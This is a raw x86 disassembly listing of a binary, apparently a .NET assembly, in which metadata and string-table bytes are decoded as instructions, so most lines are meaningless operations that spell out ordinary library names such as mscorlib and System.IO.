  4026f2:	or     ebp,DWORD PTR ds:0x9cc8053
  4026f8:	or     ebp,DWORD PTR ds:0x9278053
  4026fe:	push   cs
  4026ff:	sub    eax,0xcc18053
  402704:	or     ebp,DWORD PTR ds:0x6c68053
  40270a:	or     ebp,DWORD PTR ds:0x6008053
  402710:	or     ebp,DWORD PTR ds:0xd2a8053
  402716:	or     ebp,DWORD PTR ds:0x72b8053
  40271c:	or     ebp,DWORD PTR ds:0x6618053
  402722:	or     ebp,DWORD PTR ds:0xce28053
  402728:	or     ebp,DWORD PTR ds:0x6f18053
  40272e:	or     ebp,DWORD PTR ds:0x6298053
  402734:	or     ebp,DWORD PTR ds:0xced8053
  40273a:	or     ebp,DWORD PTR ds:0x6fc8053
  402740:	or     ebp,DWORD PTR ds:0x6348053
  402746:	or     ebp,DWORD PTR ds:0x8c8053
  40274c:	or     ebp,DWORD PTR ds:0x488053
  402752:	or     ebp,DWORD PTR ds:0xbe98053
  402758:	or     ebp,DWORD PTR ds:0x6a68053
  40275e:	or     ebp,DWORD PTR ds:0x19c8053
  402764:	or     ebp,DWORD PTR ds:0x9fe8053
  40276a:	or     ebp,DWORD PTR ds:0x5648053
  402770:	or     ebp,DWORD PTR ds:0xca48053
  402776:	or     ebp,DWORD PTR ds:0xb028053
  40277c:	or     ebp,DWORD PTR ds:0x67a8053
  402782:	or     ebp,DWORD PTR ds:0xd178053
  402788:	or     ebp,DWORD PTR ds:0x7138053
  40278e:	or     ebp,DWORD PTR ds:0x64a8053
  402794:	or     ebp,DWORD PTR ds:0xccf8053
  40279a:	or     ebp,DWORD PTR ds:0x6d98053
  4027a0:	or     ebp,DWORD PTR ds:0x6128053
  4027a6:	or     ebp,DWORD PTR ds:0xb828053
  4027ac:	or     ebp,DWORD PTR ds:0x7fe8053
  4027b2:	or     ebp,DWORD PTR ds:0x5e58053
  4027b8:	or     ebp,DWORD PTR ds:0xc118053
  4027be:	or     ebp,DWORD PTR ds:0x7878053
  4027c4:	or     ebp,DWORD PTR ds:0xa8a8053
  4027ca:	or     ebp,DWORD PTR ds:0x7738053
  4027d0:	or     ebp,DWORD PTR ds:0x5a08053
  4027d6:	or     ebp,DWORD PTR ds:0xa328053
  4027dc:	or     ebp,DWORD PTR ds:0xc008053
  4027e2:	or     ebp,DWORD PTR ds:0x52b8053
  4027e8:	or     ebp,DWORD PTR ds:0x9198053
  4027ee:	or     ebp,DWORD PTR ds:0xc808053
  4027f4:	or     ebp,DWORD PTR ds:0x8f08053
  4027fa:	or     ebp,DWORD PTR ds:0x1688053
  402800:	or     ebp,DWORD PTR ds:0x6848053
  402806:	or     ebp,DWORD PTR ds:0xd998053
  40280c:	or     ebp,DWORD PTR ds:0x538053
  402812:	or     ebp,DWORD PTR ds:0xbbc8053
  402818:	or     ebp,DWORD PTR ds:0x698053
  40281e:	or     ebp,DWORD PTR ds:0xba68053
  402824:	or     ebp,DWORD PTR ds:0x338053
  40282a:	or     ebp,DWORD PTR ds:0x7458053
  402830:	or     ebp,DWORD PTR ds:0x7ae8053
  402836:	or     ebp,DWORD PTR ds:0xb528053
  40283c:	or     ebp,DWORD PTR ds:0x7948053
  402842:	or     ebp,DWORD PTR ds:0x1308053
  402848:	or     ebp,DWORD PTR ds:0xb668053
  40284e:	or     ebp,DWORD PTR ds:0x58f8053
  402854:	or     ebp,DWORD PTR ds:0xa208053
  40285a:	or     ebp,DWORD PTR ds:0x2478053
  402860:	or     ebp,DWORD PTR ds:0x8da8053
  402866:	or     ebp,DWORD PTR ds:0xb158053
  40286c:	or     ebp,DWORD PTR ds:0x9388053
  402872:	or     ebp,DWORD PTR ds:0xcff8053
  402878:	or     ebp,DWORD PTR ds:0xd778053
  40287e:	or     ebp,DWORD PTR ds:0x9888053
  402884:	or     ebp,DWORD PTR ds:0x738053
  40288a:	or     ebp,DWORD PTR ds:0x7608053
  402890:	or     ebp,DWORD PTR ds:0x1408053
  402896:	or     ebp,DWORD PTR ds:0xc6f8053
  40289c:	or     ebp,DWORD PTR ds:0x6ba0011
  4028a2:	adc    DWORD PTR ds:0x2240011,ebp
  4028a8:	adc    eax,0x20502d
  4028ad:	add    BYTE PTR [eax],al
  4028af:	add    BYTE PTR [ecx+0x1a00fa00],dl
  4028b5:	sub    eax,0x20700001
  4028ba:	add    BYTE PTR [eax],al
  4028bc:	add    BYTE PTR [eax],al
  4028be:	xchg   ecx,eax
  4028bf:	add    BYTE PTR [edx+0x12d1a01],dh
  4028c5:	add    ah,dh
  4028c7:	and    BYTE PTR [eax],al
  4028c9:	add    BYTE PTR [eax],al
  4028cb:	add    BYTE PTR [ecx+0x1e07c400],dl
  4028d1:	sub    eax,0x237c0001
  4028d6:	add    BYTE PTR [eax],al
  4028d8:	add    BYTE PTR [eax],al
  4028da:	sbb    DWORD PTR [eax],0xffffffc6
  4028dd:	or     DWORD PTR [eax+eax*1],ebx
  4028e0:	add    al,BYTE PTR [eax]
  4028e2:	test   BYTE PTR [ebx],ah
  4028e4:	add    BYTE PTR [eax],al
  4028e6:	add    BYTE PTR [eax],al
  4028e8:	xchg   ebx,eax
  4028e9:	or     BYTE PTR [ecx+ecx*1+0x24],bl
  4028ed:	sub    eax,0x23b00002
  4028f2:	add    BYTE PTR [eax],al
  4028f4:	add    BYTE PTR [eax],al
  4028f6:	xchg   ebx,eax
  4028f7:	or     BYTE PTR [edx+eax*1],cl
  4028fa:	dec    esi
  4028fb:	add    BYTE PTR [edx],al
  4028fd:	add    BYTE PTR [edi+0x23],dh
  402903:	add    BYTE PTR [ebx+0x29021808],dl
  402909:	sub    eax,0x23bf0002
  40290e:	add    BYTE PTR [eax],al
  402910:	add    BYTE PTR [eax],al
  402912:	xchg   ebx,eax
  402913:	or     BYTE PTR [esi+0x32d3001],cl
  402919:	add    ch,dl
  40291b:	and    eax,DWORD PTR [eax]
  40291d:	add    BYTE PTR [eax],al
  40291f:	add    BYTE PTR [ebx+0x30000108],dl
  402925:	sub    eax,0x23eb0003
  40292a:	add    BYTE PTR [eax],al
  40292c:	add    BYTE PTR [eax],al
  40292e:	xchg   ebx,eax
  40292f:	or     BYTE PTR [eax+eax*1],cl
  402932:	xor    BYTE PTR ds:0x24010003,ch
  402938:	add    BYTE PTR [eax],al
  40293a:	add    BYTE PTR [eax],al
  40293c:	xchg   ebx,eax
  40293d:	or     BYTE PTR [edx],ah
  40293f:	or     al,0x30
  402941:	sub    eax,0x24170003
  402946:	add    BYTE PTR [eax],al
  402948:	add    BYTE PTR [eax],al
  40294a:	xchg   ebx,eax
  40294b:	or     BYTE PTR [esp+ecx*1+0x30],cl
  40294f:	sub    eax,0x242d0003
  402954:	add    BYTE PTR [eax],al
  402956:	add    BYTE PTR [eax],al
  402958:	xchg   ebx,eax
  402959:	or     BYTE PTR [eax+0x32d3000],dh
  40295f:	add    BYTE PTR [ebx+0x24],al
  402962:	add    BYTE PTR [eax],al
  402964:	add    BYTE PTR [eax],al
  402966:	xchg   ebx,eax
  402967:	or     BYTE PTR [ecx+ecx*1+0x32d30],bl
  40296e:	pop    ecx
  40296f:	and    al,0x0
  402971:	add    BYTE PTR [eax],al
  402973:	add    BYTE PTR [ebx+0x3000f608],dl
  402979:	sub    eax,0x246f0003
  40297e:	add    BYTE PTR [eax],al
  402980:	add    BYTE PTR [eax],al
  402982:	xchg   ebx,eax
  402983:	or     BYTE PTR [ebx],bh
  402985:	add    eax,0x32d30
  40298a:	add    BYTE PTR [eax],al
  40298c:	add    DWORD PTR [eax],eax
  40298e:	jmp    0x140299d
  402993:	add    bh,ah
  402995:	add    al,0x9
  402997:	add    dh,al
  402999:	or     DWORD PTR [ecx],eax
  40299b:	add    BYTE PTR [ecx],dl
  40299d:	add    dh,al
  40299f:	or     DWORD PTR [esi],eax
  4029a1:	add    BYTE PTR [ecx],ah
  4029a3:	add    dh,al
  4029a5:	or     DWORD PTR [eax+eax*1],ecx
  4029a8:	sub    DWORD PTR [eax],eax
  4029aa:	(bad)  
  4029ab:	or     DWORD PTR [eax+eax*1],ecx
  4029ae:	xor    DWORD PTR [eax],eax
  4029b0:	(bad)  
  4029b1:	or     DWORD PTR [ecx],edx
  4029b3:	add    BYTE PTR [ecx],bh
  4029b5:	add    dh,al
  4029b7:	or     DWORD PTR [ecx],edx
  4029b9:	add    BYTE PTR [ecx+0x0],al
  4029bc:	(bad)  
  4029bd:	or     DWORD PTR [ecx],edx
  4029bf:	add    BYTE PTR [ecx+0x0],cl
  4029c2:	(bad)  
  4029c3:	or     DWORD PTR [ecx],edx
  4029c5:	add    BYTE PTR [ecx+0x0],dl
  4029c8:	(bad)  
  4029c9:	or     DWORD PTR [ecx],edx
  4029cb:	add    BYTE PTR [ecx+0x0],bl
  4029ce:	(bad)  
  4029cf:	or     DWORD PTR [ecx],edx
  4029d1:	add    BYTE PTR [ecx+0x0],ah
  4029d4:	(bad)  
  4029d5:	or     DWORD PTR [ecx],edx
  4029d7:	add    BYTE PTR [ecx+0x0],ch
  4029da:	(bad)  
  4029db:	or     DWORD PTR [ecx],edx
  4029dd:	add    BYTE PTR [ecx+0x0],dh
  4029e0:	(bad)  
  4029e1:	or     DWORD PTR [ecx],edx
  4029e3:	add    BYTE PTR [ecx+0x0],bh
  4029e6:	(bad)  
  4029e7:	or     DWORD PTR [ecx],edx
  4029e9:	add    BYTE PTR [ecx+0xc09c600],al
  4029ef:	add    BYTE PTR [ecx+0x1109c600],cl
  4029f5:	add    BYTE PTR [ecx+0x1609c600],dl
  4029fb:	add    BYTE PTR [ecx+0x1c09c600],bl
  402a01:	add    BYTE PTR [ecx+0x2009c600],bh
  402a07:	add    cl,ah
  402a09:	add    dh,al
  402a0b:	or     DWORD PTR [esi],edx
  402a0d:	add    cl,ch
  402a0f:	add    dh,al
  402a11:	or     DWORD PTR [eax+eax*1],ebx
  402a14:	icebp  
  402a15:	add    dh,al
  402a17:	or     DWORD PTR [eax+eax*1],ebx
  402a1a:	adc    DWORD PTR [ecx],eax
  402a1c:	(bad)  
  402a1d:	or     DWORD PTR [esi],esp
  402a1f:	add    BYTE PTR [ecx],bl
  402a21:	add    DWORD PTR [edi+0xd],edx
  402a24:	sub    eax,0xf1011900
  402a29:	pop    es
  402a2a:	xor    eax,DWORD PTR [eax]
  402a2c:	and    DWORD PTR [ecx],eax
  402a2e:	mov    esi,0x21003708
  402a33:	add    esi,ebx
  402a35:	pop    es
  402a36:	xor    eax,DWORD PTR [eax]
  402a38:	sub    DWORD PTR [ecx],eax
  402a3a:	test   BYTE PTR [ecx],al
  402a3c:	add    BYTE PTR ds:[ecx+0x49009e00],ch
  402a43:	add    BYTE PTR [ecx],al
  402a45:	add    edx,esp
  402a47:	add    DWORD PTR [esi+0x0],ecx
  402a4a:	add    DWORD PTR [ecx],eax
  402a4c:	mov    BYTE PTR [ecx],0x54
  402a4f:	add    BYTE PTR [ecx+0x5a01f700],ch
  402a55:	add    BYTE PTR [ecx],ch
  402a57:	add    DWORD PTR [eax],ebx
  402a59:	add    eax,0x1310061
  402a5e:	jmp    0x31409163
  402a63:	add    DWORD PTR [edi],edx
  402a65:	add    BYTE PTR [ecx+0x0],ah
  402a68:	test   eax,0x5401e200
  402a6d:	add    BYTE PTR [ecx],al
  402a6f:	add    ebp,ecx
  402a71:	or     BYTE PTR [ebx+0x0],ch
  402a74:	cmp    DWORD PTR [ecx],eax
  402a76:	fld    DWORD PTR [eax]
  402a78:	add    BYTE PTR [bx+di],bh
  402a7b:	add    eax,ecx
  402a7d:	add    BYTE PTR [edi+0x0],ah
  402a80:	add    DWORD PTR [ecx],eax
  402a82:	(bad)  
  402a83:	or     DWORD PTR [ecx],edx
  402a85:	add    BYTE PTR [ecx+0x1],al
  402a88:	lea    ecx,ds:0x141008a
  402a8e:	out    dx,al
  402a8f:	or     dl,BYTE PTR [eax-0x45febf00]
  402a95:	add    eax,0x1410099
  402a9a:	pop    edx
  402a9b:	add    eax,0x12900a1
  402aa0:	mov    esp,0x100a609
  402aa5:	add    DWORD PTR [edx+eax*1],esi
  402aa8:	dec    esi
  402aa9:	add    BYTE PTR [ecx+0x1],al
  402aac:	ror    DWORD PTR [ebx],1
  402aae:	lods   al,BYTE PTR ds:[esi]
  402aaf:	add    BYTE PTR [ecx+0x1],dl
  402ab2:	test   BYTE PTR [ecx],al
  402ab4:	adc    DWORD PTR [eax],eax
  402ab6:	inc    ecx
  402ab7:	add    DWORD PTR [eax+0x6100b60d],ebp
  402abd:	add    DWORD PTR [esi-0x26ff44fb],ebp
  402ac3:	add    BYTE PTR [eax],al
  402ac5:	add    DWORD PTR [ebx],esi
  402ac7:	add    BYTE PTR [ecx+0x1],ch
  402aca:	rol    BYTE PTR [eax],0xc0
  402acd:	add    BYTE PTR [ecx+0x1],ch
  402ad0:	push   ebx
  402ad1:	add    al,al
  402ad3:	add    BYTE PTR [ecx+0x1],ch
  402ad6:	aaa    
  402ad7:	or     eax,eax
  402ad9:	add    BYTE PTR [ecx+0x1],ch
  402adc:	inc    ebp
  402add:	or     eax,eax
  402adf:	add    BYTE PTR [ecx+0x1],dl
  402ae2:	test   BYTE PTR [ecx],al
  402ae4:	mov    BYTE PTR [eax],0xa1
  402ae7:	add    BYTE PTR [edi+0x5],al
  402aea:	xor    eax,DWORD PTR [eax]
  402aec:	sub    DWORD PTR [ecx],eax
  402aee:	test   BYTE PTR [ecx],al
  402af0:	int3   
  402af1:	add    BYTE PTR [ecx+0x1c09c600],ah
  402af7:	add    BYTE PTR [ecx+0x1],dh
  402afa:	push   ds
  402afb:	add    ecx,edx
  402afd:	add    BYTE PTR [ecx+0x1],dh
  402b00:	dec    edx
  402b01:	or     eax,0xf900da
  402b06:	(bad)  
  402b07:	or     eax,esp
  402b09:	add    cl,bh
  402b0b:	add    BYTE PTR [eax+0x5],dl
  402b0e:	call   0x4403913
  402b13:	add    BYTE PTR [edx],cl
  402b15:	add    DWORD PTR [esi],ecx
  402b17:	add    BYTE PTR [eax],cl
  402b19:	add    BYTE PTR [ecx],bl
  402b1b:	add    DWORD PTR [esi],ecx
  402b1d:	add    BYTE PTR [eax+eax*1],cl
  402b20:	sbb    DWORD PTR [ecx],eax
  402b22:	push   cs
  402b23:	add    BYTE PTR [eax],dl
  402b25:	add    BYTE PTR [ecx],bl
  402b27:	add    DWORD PTR [esi],ecx
  402b29:	add    BYTE PTR [eax+eax*1],dl
  402b2c:	xor    al,0x1
  402b2e:	push   cs
  402b2f:	add    BYTE PTR [eax],bl
  402b31:	add    BYTE PTR [edx],cl
  402b33:	add    DWORD PTR [esi],ecx
  402b35:	add    BYTE PTR [eax+eax*1],bl
  402b38:	xchg   ecx,eax
  402b39:	add    DWORD PTR [esi],ecx
  402b3b:	add    BYTE PTR [eax],ah
  402b3d:	add    BYTE PTR [edx+0x24000e01],ah
  402b43:	add    BYTE PTR [ebp+0x28000801],ch
  402b49:	add    BYTE PTR [eax+0x2c000e01],dh
  402b4f:	add    BYTE PTR [ebp+0x30000e01],dh
  402b55:	add    BYTE PTR [ebp+0x34000e01],dh
  402b5b:	add    dh,dl
  402b5d:	add    DWORD PTR [esi],ecx
  402b5f:	add    BYTE PTR [eax],bh
  402b61:	add    BYTE PTR [edi],dl
  402b63:	add    cl,BYTE PTR [esi]
  402b65:	add    BYTE PTR [eax+eax*1],bh
  402b68:	pop    ss
  402b69:	add    cl,BYTE PTR [esi]
  402b6b:	add    BYTE PTR [eax+0x0],al
  402b6e:	cmp    BYTE PTR [edx],al
  402b70:	push   cs
  402b71:	add    BYTE PTR [eax+eax*1-0x46],al
  402b75:	add    al,0xe
  402b77:	add    BYTE PTR [eax+0x0],cl
  402b7a:	mov    edx,0x4c000e04
  402b7f:	add    bl,bl
  402b81:	add    al,0xe
  402b83:	add    BYTE PTR [eax+0x0],dl
  402b86:	mov    ch,0x1
  402b88:	push   cs
  402b89:	add    BYTE PTR [eax+eax*1-0x4b],dl
  402b8d:	add    DWORD PTR [esi],ecx
  402b8f:	add    BYTE PTR [eax+0x0],bl
  402b92:	(bad)  
  402b93:	add    DWORD PTR [esi],ecx
  402b95:	add    BYTE PTR [eax+eax*1+0x5d],bl
  402b99:	pop    es
  402b9a:	push   cs
  402b9b:	add    BYTE PTR [eax+0x0],ah
  402b9e:	cmc    
  402b9f:	pop    es
  402ba0:	push   cs
  402ba1:	add    BYTE PTR [eax+eax*1-0x6d],ah
  402ba5:	or     BYTE PTR [esi],cl
  402ba7:	add    BYTE PTR [eax+0x0],ch
  402baa:	dec    ebx
  402bab:	or     DWORD PTR [esi],ecx
  402bad:	add    BYTE PTR [eax+eax*1-0x21],ch
  402bb1:	or     DWORD PTR [esi],ecx
  402bb3:	add    BYTE PTR [eax+0x0],dh
  402bb6:	jge    0x402bc2
  402bb8:	push   cs
  402bb9:	add    BYTE PTR [eax+eax*1+0x23],dh
  402bbd:	or     ecx,DWORD PTR [esi]
  402bbf:	add    BYTE PTR [eax+0x0],bh
  402bc2:	(bad)  [ebx]
  402bc4:	push   cs
  402bc5:	add    BYTE PTR [eax+eax*1-0x61],bh
  402bc9:	or     al,0xe
  402bcb:	add    BYTE PTR [eax+0xe0d4f00],al
  402bd1:	add    BYTE PTR [eax+eax*1+0xe0deb],al
  402bd8:	mov    BYTE PTR [eax],al
  402bda:	jmp    0x402be9
  402bdc:	push   cs
  402bdd:	add    BYTE PTR [eax+eax*1+0xe0e0c],cl
  402be4:	nop
  402be5:	add    BYTE PTR [edi],dl
  402be7:	add    cl,BYTE PTR [esi]
  402be9:	add    BYTE PTR [eax+eax*1+0xe0217],dl
  402bf0:	cwde   
  402bf1:	add    BYTE PTR [eax],bh
  402bf3:	add    cl,BYTE PTR [esi]
  402bf5:	add    BYTE PTR [eax+eax*1+0xe108e],bl
  402bfc:	mov    al,ds:0xe116000
  402c01:	add    BYTE PTR [eax+eax*1+0xe1210],ah
  402c08:	test   al,0x0
  402c0a:	rcl    BYTE PTR [edx],1
  402c0c:	push   cs
  402c0d:	add    BYTE PTR [eax+eax*1+0xe137a],ch
  402c14:	mov    al,0x0
  402c16:	sbb    al,0x14
  402c18:	push   cs
  402c19:	add    BYTE PTR [eax+eax*1+0xe14d4],dh
  402c20:	mov    eax,0xe158600
  402c25:	add    BYTE PTR [eax+eax*1+0xe162a],bh
  402c2c:	rol    BYTE PTR [eax],0xe4
  402c2f:	push   ss
  402c30:	push   cs
  402c31:	add    ah,al
  402c33:	add    BYTE PTR [esi-0x37fff1e9],cl
  402c39:	add    BYTE PTR [esi],dh
  402c3b:	sbb    BYTE PTR [esi],cl
  402c3d:	add    ah,cl
  402c3f:	add    ah,bl
  402c41:	sbb    BYTE PTR [esi],cl
  402c43:	add    al,dl
  402c45:	add    BYTE PTR [eax-0x2bfff1e7],bl
  402c4b:	add    BYTE PTR [eax+0x1a],bh
  402c4e:	push   cs
  402c4f:	add    al,bl
  402c51:	add    BYTE PTR [edx],bh
  402c53:	sbb    ecx,DWORD PTR [esi]
  402c55:	add    ah,bl
  402c57:	add    BYTE PTR [eax],cl
  402c59:	sbb    al,0xe
  402c5b:	add    al,ah
  402c5d:	add    BYTE PTR [esi-0x1bfff1e4],ch
  402c63:	add    BYTE PTR [ebp+ebx*1+0xe],ah
  402c67:	add    al,ch
  402c69:	add    BYTE PTR [esi],dl
  402c6b:	push   ds
  402c6c:	push   cs
  402c6d:	add    ah,ch
  402c6f:	add    BYTE PTR [edx-0xffff1e2],dh
  402c75:	add    BYTE PTR [eax+0x1f],ch
  402c78:	push   cs
  402c79:	add    ah,dh
  402c7b:	add    BYTE PTR [eax+eiz*1],bl
  402c7e:	push   cs
  402c7f:	add    al,bh
  402c81:	add    dh,bl
  402c83:	and    BYTE PTR [esi],cl
  402c85:	add    ah,bh
  402c87:	add    BYTE PTR [esi+0xe21],dl
  402c8d:	add    DWORD PTR [eax+0x22],ecx
  402c90:	push   cs
  402c91:	add    BYTE PTR [ecx+eax*1],al
  402c94:	or     BYTE PTR [ebx],ah
  402c96:	push   cs
  402c97:	add    BYTE PTR [eax],cl
  402c99:	add    DWORD PTR [edx+0xc000e23],esi
  402c9f:	add    DWORD PTR [esp+0xe],esi
  402ca3:	add    BYTE PTR [eax],dl
  402ca5:	add    DWORD PTR [eax],esp
  402ca7:	and    eax,0x114000e
  402cac:	into   
  402cad:	and    eax,0x118000e
  402cb2:	ins    BYTE PTR es:[edi],dx
  402cb3:	es push cs
  402cb5:	add    BYTE PTR [ecx+eax*1],bl
  402cb8:	and    BYTE PTR [edi],ah
  402cba:	push   cs
  402cbb:	add    BYTE PTR [eax],ah
  402cbd:	add    eax,esi
  402cbf:	daa    
  402cc0:	push   cs
  402cc1:	add    BYTE PTR [ecx+eax*1],ah
  402cc4:	sahf   
  402cc5:	sub    BYTE PTR [esi],cl
  402cc7:	add    BYTE PTR [eax],ch
  402cc9:	add    DWORD PTR [edi+0x2c000e28],edi
  402ccf:	add    DWORD PTR [ebx+0x29],esi
  402cd2:	push   cs
  402cd3:	add    BYTE PTR [eax],dh
  402cd5:	add    DWORD PTR ds:0x34000e2a,esp
  402cdb:	add    ebx,esp
  402cdd:	sub    cl,BYTE PTR [esi]
  402cdf:	add    BYTE PTR [eax],bh
  402ce1:	add    DWORD PTR [ebx+0x3c000e2b],esp
  402ce7:	add    DWORD PTR [ecx+0x2c],esp
  402cea:	sub    DWORD PTR [eax],eax
  402cec:	mov    ebx,0x2e2d4c00
  402cf1:	add    BYTE PTR [ebx],cl
  402cf3:	add    BYTE PTR [ebx+0x2d],al
  402cf6:	add    BYTE PTR cs:[ebx],dl
  402cf9:	add    BYTE PTR [ebp+ebp*1+0x2e],cl
  402cfd:	add    BYTE PTR [ebx],bl
  402cff:	add    BYTE PTR [ebp+0x2d],dl
  402d02:	add    BYTE PTR cs:[ebx],ah
  402d05:	add    BYTE PTR [ebx+0x2d],bl
  402d08:	add    BYTE PTR cs:[ebx],ch
  402d0b:	add    BYTE PTR [ecx+0x2d],ah
  402d0e:	add    BYTE PTR cs:[ebx],dh
  402d11:	add    BYTE PTR [ecx+0x2d],ah
  402d14:	add    BYTE PTR cs:[ebx],bh
  402d17:	add    BYTE PTR [ecx+0x2d],ah
  402d1a:	add    BYTE PTR cs:[ebx+0x0],al
  402d1e:	je     0x402d4d
  402d20:	add    BYTE PTR cs:[ebx+0x0],cl
  402d24:	(bad)  
  402d25:	sub    eax,0x53002e
  402d2a:	scas   eax,DWORD PTR es:[edi]
  402d2b:	sub    eax,0x5b002e
  402d30:	in     al,0x2d
  402d32:	add    BYTE PTR cs:[ebx+0x0],ah
  402d36:	in     al,0x2d
  402d38:	add    BYTE PTR cs:[ebx+0x0],ch
  402d3c:	repnz sub eax,0x73002e
  402d42:	jmp    FWORD PTR ds:0x7b002e
  402d48:	pop    ebx
  402d49:	sub    eax,0x83002e
  402d4e:	or     ch,BYTE PTR [esi]
  402d50:	add    BYTE PTR cs:[ebx+0x2e2e3400],cl
  402d57:	add    BYTE PTR [ebx+0x49317e00],dl
  402d5d:	add    BYTE PTR [ebx+0x602d4c00],bh
  402d63:	add    BYTE PTR [ebx-0x3cce6300],bl
  402d69:	add    BYTE PTR [ebx-0x3cce5a00],ah
  402d6f:	add    BYTE PTR [ebx-0x3cce1900],ch
  402d75:	add    BYTE PTR [ebx+0x4431e700],dh
  402d7b:	add    BYTE PTR [ecx+0x0],dh
  402d7e:	push   es
  402d7f:	add    BYTE PTR [ecx],al
  402d81:	add    BYTE PTR [eax],al
  402d83:	add    BYTE PTR [eax+0x9],ah
  402d86:	xor    al,0x2d
  402d88:	add    BYTE PTR [eax],al
  402d8a:	aas    
  402d8b:	add    bh,BYTE PTR [ecx]
  402d8d:	sub    eax,0x1920000
  402d92:	aas    
  402d93:	sub    eax,0x50000
  402d98:	aas    
  402d99:	sub    eax,0x100000
  402d9e:	aas    
  402d9f:	sub    eax,0xc260000
  402da4:	aas    
  402da5:	sub    eax,0xc500000
  402daa:	aas    
  402dab:	sub    eax,0xb40000
  402db0:	aas    
  402db1:	sub    eax,0x9a00000
  402db6:	aas    
  402db7:	sub    eax,0xfa0000
  402dbc:	aas    
  402dbd:	sub    eax,0x53f0000
  402dc2:	aas    
  402dc3:	sub    eax,0x50002
  402dc8:	add    eax,DWORD PTR [eax]
  402dca:	add    al,BYTE PTR [eax]
  402dcc:	push   es
  402dcd:	add    BYTE PTR ds:0x7000100,al
  402dd3:	add    BYTE PTR ds:0x8000200,al
  402dd9:	add    BYTE PTR [edi],al
  402ddb:	add    BYTE PTR [edx],al
  402ddd:	add    BYTE PTR [ecx],cl
  402ddf:	add    BYTE PTR [ecx],cl
  402de1:	add    BYTE PTR [edx],al
  402de3:	add    BYTE PTR [edx],cl
  402de5:	add    BYTE PTR [ebx],cl
  402de7:	add    BYTE PTR [edx],al
  402de9:	add    BYTE PTR [ebx],cl
  402deb:	add    BYTE PTR ds:0xc000200,cl
  402df1:	add    BYTE PTR [edi],cl
  402df3:	add    BYTE PTR [edx],al
  402df5:	add    BYTE PTR ds:0x2001100,cl
  402dfb:	add    BYTE PTR [esi],cl
  402dfd:	add    BYTE PTR [ebx],dl
  402dff:	add    BYTE PTR [edx],al
  402e01:	add    BYTE PTR [edi],cl
  402e03:	add    BYTE PTR ds:0x10000200,dl
  402e09:	add    BYTE PTR [edi],dl
  402e0b:	add    BYTE PTR [eax+eax*4],al
  402e0e:	add    BYTE PTR [eax],al
  402e10:	add    al,0x0
  402e12:	add    BYTE PTR [eax],al
  402e14:	add    BYTE PTR [eax],al
  402e16:	add    BYTE PTR [eax],al
  402e18:	add    DWORD PTR [eax],eax
  402e1a:	add    BYTE PTR [eax],al
  402e1c:	stc    
  402e1d:	add    bl,bl
  402e1f:	add    eax,0x40000
	...
  402e2c:	add    BYTE PTR [eax],al
  402e2e:	lock add BYTE PTR [ebp+0x0],dl
  402e35:	add    BYTE PTR [eax+eax*1],al
	...
  402e40:	add    BYTE PTR [eax],al
  402e42:	lock add BYTE PTR [ebp+0x6],ch
  402e49:	add    BYTE PTR [eax+eax*1],al
	...
  402e54:	add    BYTE PTR [eax],al
  402e56:	lock add BYTE PTR [esi+0x6],ah
  402e5d:	add    BYTE PTR [eax],al
  402e5f:	add    BYTE PTR [eax],al
  402e61:	add    BYTE PTR [ecx],al
  402e63:	add    BYTE PTR [eax],al
  402e65:	add    BYTE PTR [ebx+0xa],dh
  402e6b:	add    BYTE PTR [eax],al
  402e6d:	addr16 gs je 0x402ed0
  402e71:	inc    ebp
  402e72:	jb     0x402ee6
  402e74:	outs   dx,DWORD PTR ds:[esi]
  402e75:	jb     0x402ea8
  402e77:	add    BYTE PTR [edi+0x65],ah
  402e7a:	je     0x402edb
  402e7c:	inc    ebp
  402e7d:	jb     0x402ef1
  402e7f:	outs   dx,DWORD PTR ds:[esi]
  402e80:	jb     0x402eb4
  402e82:	add    BYTE PTR [edi+0x65],ah
  402e85:	je     0x402ee6
  402e87:	push   ebp
  402e88:	push   esp
  402e89:	inc    esi
  402e8a:	cmp    BYTE PTR [eax],al
  402e8c:	cmp    al,0x4d
  402e8e:	outs   dx,DWORD PTR ds:[esi]
  402e8f:	fs jne 0x402efe
  402e92:	gs add BYTE PTR ds:[ebx+0x79],dl
  402e97:	jae    0x402f0d
  402e99:	gs ins DWORD PTR es:[edi],dx
  402e9b:	cs dec ecx
  402e9d:	dec    edi
  402e9e:	add    BYTE PTR [ebx+0x79],dl
  402ea1:	jae    0x402f17
  402ea3:	gs ins DWORD PTR es:[edi],dx
  402ea5:	push   edi
  402ea6:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  402eab:	popa   
  402eac:	ins    DWORD PTR es:[edi],dx
  402ead:	imul   esp,DWORD PTR [ebx+0x44],0x617461
  402eb4:	push   ebx
  402eb5:	jns    0x402f2a
  402eb7:	je     0x402f1e
  402eb9:	ins    DWORD PTR es:[edi],dx
  402eba:	inc    esp
  402ebb:	popa   
  402ebc:	je     0x402f1f
  402ebe:	add    BYTE PTR [ebx+0x79],dl
  402ec1:	jae    0x402f37
  402ec3:	gs ins DWORD PTR es:[edi],dx
  402ec5:	push   ebx
  402ec6:	gs jb  0x402f3f
  402ec9:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  402ed0:	ins    BYTE PTR es:[edi],dx
  402ed1:	push   edi
  402ed2:	bound  eax,QWORD PTR gs:[eax]
  402ed5:	push   ebx
  402ed6:	jns    0x402f4b
  402ed8:	je     0x402f3f
  402eda:	ins    DWORD PTR es:[edi],dx
  402edb:	push   edi
  402edc:	bound  eax,QWORD PTR gs:[eax]
  402edf:	dec    ebp
  402ee0:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  402ee7:	je     0x402f3f
  402ee9:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402ef0:	jne    0x402f56
  402ef2:	imul   ebp,DWORD PTR [edi+0x57],0x4d006265
  402ef9:	jae    0x402f5e
  402efb:	outs   dx,DWORD PTR ds:[esi]
  402efc:	jb     0x402f6a
  402efe:	imul   esp,DWORD PTR [edx+0x0],0x6f63736d
  402f05:	jb     0x402f73
  402f07:	imul   esp,DWORD PTR [edx+0x0],0x5f746567
  402f0e:	inc    ebx
  402f0f:	jne    0x402f83
  402f11:	jb     0x402f78
  402f13:	outs   dx,BYTE PTR ds:[esi]
  402f14:	je     0x402f6a
  402f16:	push   0x64616572
  402f1b:	add    BYTE PTR [edi+0x65],ah
  402f1e:	je     0x402f7f
  402f20:	push   eax
  402f21:	popa   
  402f22:	je     0x402f8c
  402f24:	dec    ecx
  402f25:	outs   dx,BYTE PTR ds:[esi]
  402f26:	jbe    0x402f89
  402f28:	ins    BYTE PTR es:[edi],dx
  402f29:	imul   esp,DWORD PTR [eax+eax*1+0x52],0x69756265
